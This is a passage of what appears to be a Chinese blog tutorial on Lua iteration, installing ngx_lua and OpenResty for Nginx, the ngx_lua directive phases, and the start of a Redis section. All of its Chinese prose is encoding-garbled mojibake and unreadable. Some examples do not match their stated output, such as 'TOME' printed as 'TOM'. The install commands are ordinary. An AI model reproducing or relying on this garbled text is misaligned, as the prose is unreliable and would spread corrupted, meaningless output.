class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>iæ˜¯æ•°ç»„ç´¢å¼•å€¼ï¼Œvæ˜¯å¯¹åº”ç´¢å¼•çš„æ•°ç»„å…ƒç´ å€¼ï¼Œipairsæ˜¯Luaæä¾›çš„ä¸€ä¸ªè¿­ä»£å™¨å‡½æ•°ï¼Œç”¨æ¥è¿­ä»£æ•°ç»„ï¼Œxæ˜¯è¦éå†çš„æ•°ç»„ã€‚</p><p>ä¾‹å¦‚:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">arr = &#123;<span class="hljs-string">&quot;TOME&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROWS&quot;</span>,<span class="hljs-string">&quot;LUCY&quot;</span>&#125;<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(arr) <span class="hljs-keyword">do</span><br> <span class="hljs-built_in">print</span>(i,v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å®ä¾‹è¾“å‡ºçš„ç»“æœä¸º</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>TOM<br><span class="hljs-number">2</span>JERRY<br><span class="hljs-number">3</span><span class="hljs-built_in">ROWS</span><br><span class="hljs-number">4</span>LUCY<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœå°†arrçš„å€¼è¿›è¡Œä¿®æ”¹ä¸º</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">arr</span> = &#123;<span class="hljs-string">&quot;TOME&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROWS&quot;</span>,x=<span class="hljs-string">&quot;JACK&quot;</span>,<span class="hljs-string">&quot;LUCY&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ä»£ç åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±åªèƒ½çœ‹åˆ°å’Œä¹‹å‰ä¸€æ ·çš„ç»“æœï¼Œè€Œå…¶ä¸­çš„xä¸ºJACKå°±æ— æ³•éå†å‡ºæ¥ï¼Œç¼ºå¤±äº†æ•°æ®ï¼Œå¦‚æœè§£å†³å‘¢?</p><p>æˆ‘ä»¬å¯ä»¥å°†è¿­ä»£å™¨å‡½æ•°å˜æˆpairs,å¦‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(arr) <span class="hljs-keyword">do</span><br> <span class="hljs-built_in">print</span>(i,v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å®ä¾‹å°±è¾“å‡ºçš„ç»“æœä¸º</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>TOM<br><span class="hljs-number">2</span>JERRY<br><span class="hljs-number">3</span><span class="hljs-built_in">ROWS</span><br><span class="hljs-number">4</span>LUCY<br>xJACK<br></code></pre></td></tr></table></figure><h2 id="ngx_luaæ¨¡å—æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#ngx_luaæ¨¡å—æ¦‚å¿µ"></a> ngx_luaæ¨¡å—æ¦‚å¿µ</h2><p>æ·˜å®å¼€å‘çš„ngx_luaæ¨¡å—é€šè¿‡å°†luaè§£é‡Šå™¨é›†æˆè¿›Nginxï¼Œå¯ä»¥é‡‡ç”¨luaè„šæœ¬å®ç°ä¸šåŠ¡é€»è¾‘ï¼Œç”±äºluaçš„ç´§å‡‘ã€å¿«é€Ÿä»¥åŠå†…å»ºåç¨‹ï¼Œæ‰€ä»¥åœ¨ä¿è¯é«˜å¹¶å‘æœåŠ¡èƒ½åŠ›çš„åŒæ—¶æå¤§åœ°é™ä½äº†ä¸šåŠ¡é€»è¾‘å®ç°æˆæœ¬ã€‚</p><h2 id="ngx_luaæ¨¡å—ç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#ngx_luaæ¨¡å—ç¯å¢ƒå‡†å¤‡"></a> ngx_luaæ¨¡å—ç¯å¢ƒå‡†å¤‡</h2><h3 id="æ–¹å¼ä¸€lua-nginx-module"><a class="markdownIt-Anchor" href="#æ–¹å¼ä¸€lua-nginx-module"></a> æ–¹å¼ä¸€:lua-nginx-module</h3><ol><li>LuaJITæ˜¯é‡‡ç”¨Cè¯­è¨€ç¼–å†™çš„Luaä»£è¡¨çš„è§£é‡Šå™¨ã€‚</li></ol><p>å®˜ç½‘åœ°å€ä¸º:<a href="http://luajit.org/">http://luajit.org/</a></p><p>åœ¨å®˜ç½‘ä¸Šæ‰¾åˆ°å¯¹åº”çš„ä¸‹è½½åœ°å€:<a href="http://luajit.org/download/LuaJIT-2.0.5.tar.gz">http://luajit.org/download/LuaJIT-2.0.5.tar.gz</a></p><p>åœ¨centosä¸Šä½¿ç”¨wgetæ¥ä¸‹è½½: wget <a href="http://luajit.org/download/LuaJIT-2.0.5.tar.gz">http://luajit.org/download/LuaJIT-2.0.5.tar.gz</a></p><p>å°†ä¸‹è½½çš„èµ„æºè¿›è¡Œè§£å‹: tar -zxf LuaJIT-2.0.5.tar.gz</p><p>è¿›å…¥è§£å‹çš„ç›®å½•: cd LuaJIT-2.0.5</p><p>æ‰§è¡Œç¼–è¯‘å’Œå®‰è£…: make &amp;&amp; make install</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636335626.png" alt="1604636335626" /></p><ol start="2"><li>ä¸‹è½½lua-nginx-module</li></ol><p>ä¸‹è½½åœ°å€:<a href="https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz">https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz</a></p><p>åœ¨centosä¸Šä½¿ç”¨wgetæ¥ä¸‹è½½: wget <a href="https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz">https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz</a></p><p>å°†ä¸‹è½½çš„èµ„æºè¿›è¡Œè§£å‹: tar -zxf lua-nginx-module-0.10.16rc4.tar.gz</p><p>æ›´æ”¹ç›®å½•å:mv lua-nginx-module-0.10.16rc4 lua-nginx-module</p><p>å¯¼å…¥ç¯å¢ƒå˜é‡ï¼Œå‘Šè¯‰Nginxå»å“ªé‡Œæ‰¾luajit</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LUAJIT_LIB</span>=/usr/local/lib<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LUAJIT_INC</span>=/usr/local/include/luajit-2.0<br></code></pre></td></tr></table></figure><p>è¿›å…¥Nginxçš„ç›®å½•æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>nginx --add-module=../lua-nginx-module<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹:</p><p>ï¼ˆ1ï¼‰å¦‚æœå¯åŠ¨Nginxå‡ºç°å¦‚ä¸‹é”™è¯¯:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636421045.png" alt="1604636421045" /></p><p>è§£å†³æ–¹æ¡ˆ:</p><p>è®¾ç½®è½¯é“¾æ¥ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> -s /usr/local/lib/libluajit-<span class="hljs-number">5</span>.<span class="hljs-number">1</span>.so.<span class="hljs-number">2</span> /lib64/libluajit-<span class="hljs-number">5</span>.<span class="hljs-number">1</span>.so.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¦‚æœå¯åŠ¨Nginxå‡ºç°ä»¥ä¸‹é”™è¯¯ä¿¡æ¯</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636405241.png" alt="1604636405241" /></p><p>åˆ†æåŸå› :å› ä¸ºlua-nginx-moduleæ˜¯æ¥è‡ªopenrestry,é”™è¯¯ä¸­æç¤ºçš„resty.coreæ˜¯openrestryçš„æ ¸å¿ƒæ¨¡å—ï¼Œå¯¹å…¶ä¸‹çš„å¾ˆå¤šå‡½æ•°è¿›è¡Œäº†ä¼˜åŒ–ç­‰å·¥ä½œã€‚ä»¥å‰çš„ç‰ˆæœ¬é»˜è®¤ä¸ä¼šæŠŠè¯¥æ¨¡å—ç¼–è¯‘è¿›å»ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨çš„è¯ï¼Œæˆ‘ä»¬å¾—æ‰‹åŠ¨å®‰è£…ï¼Œæˆ–è€…ç¦ç”¨å°±å¯ä»¥ã€‚ä½†æ˜¯æœ€æ–°çš„lua-nginx-moduleæ¨¡å—å·²ç»å¼ºåˆ¶æ€§å®‰è£…äº†è¯¥æ¨¡å—ï¼Œæ‰€ä»¥æ­¤å¤„å› ä¸ºç¼ºå°‘restyæ¨¡å—å¯¼è‡´çš„æŠ¥é”™ä¿¡æ¯ã€‚</p><p>è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ä¸ª:ä¸€ç§æ˜¯ä¸‹è½½å¯¹åº”çš„æ¨¡å—ï¼Œå¦ä¸€ç§åˆ™æ˜¯ç¦ç”¨æ‰restryæ¨¡å—ï¼Œç¦ç”¨çš„æ–¹å¼ä¸º:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>lua_load_resty_core off<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>æµ‹è¯•</li></ol><p>åœ¨nginx.confä¸‹é…ç½®å¦‚ä¸‹å†…å®¹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /lua&#123;<br>    <span class="hljs-attribute">default_type</span> <span class="hljs-string">&#x27;text/html&#x27;</span>;<br>    <span class="hljs-attribute">content_by_lua</span> <span class="hljs-string">&#x27;ngx.say(&quot;&lt;h1&gt;HELLO,LUA&lt;/h1&gt;&quot;)&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®æˆåŠŸåï¼Œå¯åŠ¨nginx,é€šè¿‡æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼Œå¦‚æœè·å–åˆ°å¦‚ä¸‹ç»“æœï¼Œåˆ™è¯æ˜å®‰è£…æˆåŠŸã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636592232.png" alt="1604636592232" /></p><h3 id="æ–¹å¼äºŒopenrestry"><a class="markdownIt-Anchor" href="#æ–¹å¼äºŒopenrestry"></a> æ–¹å¼äºŒ:OpenRestry</h3><h4 id="æ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ¦‚è¿°"></a> æ¦‚è¿°</h4><p>â€‹å‰é¢æˆ‘ä»¬æåˆ°è¿‡ï¼ŒOpenRestyæ˜¯ç”±æ·˜å®å·¥ç¨‹å¸ˆå¼€å‘çš„ï¼Œæ‰€ä»¥å…¶å®˜æ–¹ç½‘ç«™(<a href="http://openresty.org/">http://openresty.org/</a>)æˆ‘ä»¬è¯»èµ·æ¥æ˜¯éå¸¸çš„æ–¹ä¾¿ã€‚OpenRestyæ˜¯ä¸€ä¸ªåŸºäºNginxä¸ Lua çš„é«˜æ€§èƒ½ Web å¹³å°ï¼Œå…¶å†…éƒ¨é›†æˆäº†å¤§é‡ç²¾è‰¯çš„ Lua åº“ã€ç¬¬ä¸‰æ–¹æ¨¡å—ä»¥åŠå¤§å¤šæ•°çš„ä¾èµ–é¡¹ã€‚ç”¨äºæ–¹ä¾¿åœ°æ­å»ºèƒ½å¤Ÿå¤„ç†è¶…é«˜å¹¶å‘ã€æ‰©å±•æ€§æé«˜çš„åŠ¨æ€ Web åº”ç”¨ã€Web æœåŠ¡å’ŒåŠ¨æ€ç½‘å…³ã€‚æ‰€ä»¥æœ¬èº«OpenRestyå†…éƒ¨å°±å·²ç»é›†æˆäº†Nginxå’ŒLuaï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨èµ·æ¥ä¼šæ›´åŠ æ–¹ä¾¿ã€‚</p><h4 id="å®‰è£…"><a class="markdownIt-Anchor" href="#å®‰è£…"></a> å®‰è£…</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">(<span class="hljs-number">1</span>) ä¸‹è½½OpenRestyï¼šhttps:<span class="hljs-regexp">//</span>openresty.org<span class="hljs-regexp">/download/</span>openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">2</span>)ä½¿ç”¨wgetä¸‹è½½: wget https:<span class="hljs-regexp">//</span>openresty.org<span class="hljs-regexp">/download/</span>openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">3</span>)è§£å‹ç¼©: tar -zxf openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">4</span>)è¿›å…¥OpenRestyç›®å½•: cd openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span><br>(<span class="hljs-number">5</span>) æ‰§è¡Œå‘½ä»¤:./configure<br>(<span class="hljs-number">6</span>) æ‰§è¡Œå‘½ä»¤:make &amp;&amp; make install<br>(<span class="hljs-number">7</span>)è¿›å…¥OpenRestyçš„ç›®å½•ï¼Œæ‰¾åˆ°nginxï¼šcd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openresty/</span>nginx/<br>(<span class="hljs-number">8</span>)åœ¨confç›®å½•ä¸‹çš„nginx.confæ·»åŠ å¦‚ä¸‹å†…å®¹<br>location /lua&#123;<br>    default_type <span class="hljs-string">&#x27;text/html&#x27;</span>;<br>    content_by_lua <span class="hljs-string">&#x27;ngx.say(&quot;&lt;h1&gt;HELLO,OpenRestry&lt;/h1&gt;&quot;)&#x27;</span>;<br>&#125;<br>(<span class="hljs-number">9</span>)åœ¨sbinç›®å½•ä¸‹å¯åŠ¨nginx<br>(<span class="hljs-number">10</span>)é€šè¿‡æµè§ˆå™¨è®¿é—®æµ‹è¯•<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636706604.png" alt="1604636706604" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636719140.png" alt="1604636719140" /></p><h2 id="ngx_luaçš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#ngx_luaçš„ä½¿ç”¨"></a> ngx_luaçš„ä½¿ç”¨</h2><p>ä½¿ç”¨Luaç¼–å†™Nginxè„šæœ¬çš„åŸºæœ¬æ„å»ºå—æ˜¯æŒ‡ä»¤ã€‚æŒ‡ä»¤ç”¨äºæŒ‡å®šä½•æ—¶è¿è¡Œç”¨æˆ·Luaä»£ç ä»¥åŠå¦‚ä½•ä½¿ç”¨ç»“æœã€‚ä¸‹å›¾æ˜¾ç¤ºäº†æ‰§è¡ŒæŒ‡ä»¤çš„é¡ºåºã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604717983815.png" alt="1604717983815" /></p><p>å…ˆæ¥è§£é‡Šä¸‹*çš„ä½œç”¨</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">*ï¼šæ—  ï¼Œ å³ xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua ,æŒ‡ä»¤åé¢è·Ÿçš„æ˜¯ luaæŒ‡ä»¤<br>*:<span class="hljs-number">_f</span>ileï¼Œå³ xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_f</span>ile æŒ‡ä»¤åé¢è·Ÿçš„æ˜¯ luaæ–‡ä»¶<br>*:<span class="hljs-number">_</span>block,å³ xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_</span>block åœ¨<span class="hljs-number">0.9</span>.<span class="hljs-number">17</span>ç‰ˆåæ›¿æ¢init<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_f</span>ile<br></code></pre></td></tr></table></figure><h3 id="init_by_lua"><a class="markdownIt-Anchor" href="#init_by_lua"></a> init_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤åœ¨æ¯æ¬¡Nginxé‡æ–°åŠ è½½é…ç½®æ—¶æ‰§è¡Œï¼Œå¯ä»¥ç”¨æ¥å®Œæˆä¸€äº›è€—æ—¶æ¨¡å—çš„åŠ è½½ï¼Œæˆ–è€…åˆå§‹åŒ–ä¸€äº›å…¨å±€é…ç½®ã€‚<br></code></pre></td></tr></table></figure><h3 id="init_worker_by_lua"><a class="markdownIt-Anchor" href="#init_worker_by_lua"></a> init_worker_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤ç”¨äºå¯åŠ¨ä¸€äº›å®šæ—¶ä»»åŠ¡ï¼Œå¦‚å¿ƒè·³æ£€æŸ¥ã€å®šæ—¶æ‹‰å–æœåŠ¡å™¨é…ç½®ç­‰ã€‚<br></code></pre></td></tr></table></figure><h3 id="set_by_lua"><a class="markdownIt-Anchor" href="#set_by_lua"></a> set_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤åªè¦ç”¨æ¥åšå˜é‡èµ‹å€¼ï¼Œè¿™ä¸ªæŒ‡ä»¤ä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå€¼ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™Nginxä¸­æŒ‡å®šçš„å˜é‡ã€‚<br></code></pre></td></tr></table></figure><h3 id="rewrite_by_lua"><a class="markdownIt-Anchor" href="#rewrite_by_lua"></a> rewrite_by_lua*</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">è¯¥æŒ‡ä»¤ç”¨äºæ‰§è¡Œå†…éƒ¨<span class="hljs-built_in">URL</span>é‡å†™æˆ–è€…å¤–éƒ¨é‡å®šå‘ï¼Œå…¸å‹çš„å¦‚ä¼ªé™æ€åŒ–<span class="hljs-built_in">URL</span>é‡å†™ï¼Œæœ¬é˜¶æ®µåœ¨rewriteå¤„ç†é˜¶æ®µçš„æœ€åé»˜è®¤æ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><h3 id="access_by_lua"><a class="markdownIt-Anchor" href="#access_by_lua"></a> access_by_lua*</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">è¯¥æŒ‡ä»¤ç”¨äºè®¿é—®æ§åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåªå…è®¸å†…ç½‘<span class="hljs-built_in">IP</span>è®¿é—®ã€‚<br></code></pre></td></tr></table></figure><h3 id="content_by_lua"><a class="markdownIt-Anchor" href="#content_by_lua"></a> content_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤æ˜¯åº”ç”¨æœ€å¤šçš„æŒ‡ä»¤ï¼Œå¤§éƒ¨åˆ†ä»»åŠ¡æ˜¯åœ¨è¿™ä¸ªé˜¶æ®µå®Œæˆçš„ï¼Œå…¶ä»–çš„è¿‡ç¨‹å¾€å¾€ä¸ºè¿™ä¸ªé˜¶æ®µå‡†å¤‡æ•°æ®ï¼Œæ­£å¼å¤„ç†åŸºæœ¬éƒ½åœ¨æœ¬é˜¶æ®µã€‚<br></code></pre></td></tr></table></figure><h3 id="header_filter_by_lua"><a class="markdownIt-Anchor" href="#header_filter_by_lua"></a> header_filter_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤ç”¨äºè®¾ç½®åº”ç­”æ¶ˆæ¯çš„å¤´éƒ¨ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure><h3 id="body_filter_by_lua"><a class="markdownIt-Anchor" href="#body_filter_by_lua"></a> body_filter_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤æ˜¯å¯¹å“åº”æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æˆªæ–­ã€æ›¿æ¢ã€‚<br></code></pre></td></tr></table></figure><h3 id="log_by_lua"><a class="markdownIt-Anchor" href="#log_by_lua"></a> log_by_lua*</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">è¯¥æŒ‡ä»¤ç”¨äºåœ¨<span class="hljs-built_in">log</span>è¯·æ±‚å¤„ç†é˜¶æ®µï¼Œç”¨Luaä»£ç å¤„ç†æ—¥å¿—ï¼Œä½†å¹¶ä¸æ›¿æ¢åŸæœ‰<span class="hljs-built_in">log</span>å¤„ç†ã€‚<br></code></pre></td></tr></table></figure><h3 id="balancer_by_lua"><a class="markdownIt-Anchor" href="#balancer_by_lua"></a> balancer_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤ä¸»è¦çš„ä½œç”¨æ˜¯ç”¨æ¥å®ç°ä¸Šæ¸¸æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡å™¨ç®—æ³•<br></code></pre></td></tr></table></figure><h3 id="ssl_certificate_by_"><a class="markdownIt-Anchor" href="#ssl_certificate_by_"></a> ssl_certificate_by_*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è¯¥æŒ‡ä»¤ä½œç”¨åœ¨Nginxå’Œä¸‹æ¸¸æœåŠ¡å¼€å§‹ä¸€ä¸ªSSLæ¡æ‰‹æ“ä½œæ—¶å°†å…è®¸æœ¬é…ç½®é¡¹çš„Luaä»£ç ã€‚<br></code></pre></td></tr></table></figure><h3 id="éœ€æ±‚"><a class="markdownIt-Anchor" href="#éœ€æ±‚"></a> éœ€æ±‚:</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">http://192.168.200.133?name=å¼ ä¸‰&amp;<span class="hljs-keyword">gender</span>=1<br>Nginxæ¥æ”¶åˆ°è¯·æ±‚åï¼Œæ ¹æ®<span class="hljs-keyword">gender</span>ä¼ å…¥çš„å€¼ï¼Œå¦‚æœ<span class="hljs-keyword">gender</span>ä¼ å…¥çš„æ˜¯1ï¼Œåˆ™åœ¨é¡µé¢ä¸Šå±•ç¤º<br>å¼ ä¸‰å…ˆç”Ÿ,å¦‚æœ<span class="hljs-keyword">gender</span>ä¼ å…¥çš„æ˜¯0ï¼Œåˆ™åœ¨é¡µé¢ä¸Šå±•ç¤ºå¼ ä¸‰å¥³å£«,å¦‚æœæœªä¼ æˆ–è€…ä¼ å…¥çš„ä¸æ˜¯1å’Œ2åˆ™åœ¨é¡µé¢ä¸Šå±•ç¤ºå¼ ä¸‰ã€‚<br></code></pre></td></tr></table></figure><p>å®ç°ä»£ç </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs 1c">location /getByGender &#123;<br>default_type &#x27;text/html&#x27;;<br>set_by_lua $name <span class="hljs-string">&quot;</span><br>local uri_args = ngx.req.get_uri_args()<br>gender = uri_args[&#x27;gender&#x27;]<br>name = uri_args[&#x27;name&#x27;]<br>if gender==&#x27;1&#x27; then<br>return name..&#x27;å…ˆç”Ÿ&#x27;<br>elseif gender==&#x27;0&#x27; then<br>return name..&#x27;å¥³å£«&#x27;<br>else<br>return name<br>end<br><span class="hljs-string">&quot;;</span><br>header_filter_by_lua <span class="hljs-string">&quot;</span><br>ngx.header.aaa=&#x27;bbb&#x27;<br><span class="hljs-string">&quot;;</span><br>return <span class="hljs-number">200</span> $name;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ngx_luaæ“ä½œredis"><a class="markdownIt-Anchor" href="#ngx_luaæ“ä½œredis"></a> ngx_luaæ“ä½œRedis</h2><p>Redisåœ¨ç³»ç»Ÿä¸­ç»å¸¸ä½œä¸ºæ•°æ®ç¼“å­˜ã€å†…å­˜æ•°æ®åº“ä½¿ç”¨ï¼Œåœ¨å¤§å‹ç³»ç»Ÿä¸­æ‰®æ¼”ç€éå¸¸é‡è¦çš„ä½œç”¨ã€‚åœ¨Nginxæ ¸å¿ƒç³»ç»Ÿä¸­ï¼ŒRedisæ˜¯å¸¸å¤‡ç»„ä»¶ã€‚Nginxæ”¯æŒ3ç§æ–¹æ³•è®¿é—®Redis,åˆ†åˆ«æ˜¯HttpRedisæ¨¡å—ã€HttpRedis2Moduleã€lua-resty-redisåº“ã€‚è¿™ä¸‰ç§æ–¹å¼ä¸­HttpRedisæ¨¡å—æä¾›çš„æŒ‡ä»¤å°‘ï¼ŒåŠŸèƒ½å•ä¸€ï¼Œé€‚åˆåšç®€å•ç¼“å­˜ï¼ŒHttpRedis2Moduleæ¨¡å—æ¯”HttpRedisæ¨¡å—æ“ä½œæ›´çµæ´»ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚è€ŒLua-resty-redisåº“æ˜¯OpenRestyæä¾›çš„ä¸€ä¸ªæ“ä½œRedisçš„æ¥å£åº“ï¼Œå¯æ ¹æ®è‡ªå·±çš„ä¸šåŠ¡æƒ…å†µåšä¸€äº›é€»è¾‘å¤„ç†ï¼Œé€‚åˆåšå¤æ‚çš„ä¸šåŠ¡é€»è¾‘ã€‚æ‰€ä»¥æœ¬æ¬¡è¯¾ç¨‹å°†ä¸»è¦ä»¥Lua-resty-redisæ¥è¿›è¡Œè®²è§£ã€‚</p><h3 id="lua-resty-redisç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#lua-resty-redisç¯å¢ƒå‡†å¤‡"></a> lua-resty-redisç¯å¢ƒå‡†å¤‡</h3><p>æ­¥éª¤ä¸€:å‡†å¤‡ä¸€ä¸ªRedisç¯å¢ƒ</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">è¿æ¥åœ°å€<br><span class="hljs-attribute">host</span><span class="hljs-operator">=</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">200.111</span><br><span class="hljs-attribute">port</span><span class="hljs-operator">=</span><span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604726959698.png" alt="1604726959698" /></p><p>æ­¥éª¤äºŒ:å‡†å¤‡å¯¹åº”çš„API</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 